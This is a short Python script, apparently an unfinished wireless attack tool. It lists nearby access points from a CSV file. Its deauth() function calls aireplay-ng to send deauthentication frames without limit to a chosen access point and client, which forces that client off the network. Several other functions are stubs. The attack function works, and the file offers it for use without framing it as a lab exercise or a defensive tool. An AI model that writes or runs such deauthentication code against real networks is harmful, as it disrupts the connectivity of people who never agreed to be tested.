import subprocess
from prettytable import PrettyTable
import csv

def target_ap():
    display_access_points()
    return "target_ap test"

def target_c():
    return "target_c test"

def identify_clients():
    pass

def deauth(ap_mac, c_mac):
    try:
        command = ["aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, "wlan0mon"]
        subprocess.run(command, check=True)
    except KeyboardInterrupt:
        print("\nDeauthentication interrupted")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing aireplay-ng: {e}")

def display_access_points():
    file_path = "/mnt/data/access_points.txt"
    # Initialize the PrettyTable with the specified headers
    table = PrettyTable(["ESSID", "ENC", "BSSID"])

    try:
        # Open the file and read the contents using the csv.reader for parsing CSV formatted data
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            next(csv_reader)  # Skip the header row
            for row in csv_reader:
                bssid, enc, essid = row  # Unpack the row directly into variables
                table.add_row([essid, enc, bssid])  # Add the data to the table

        print(table)  # Display the table
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
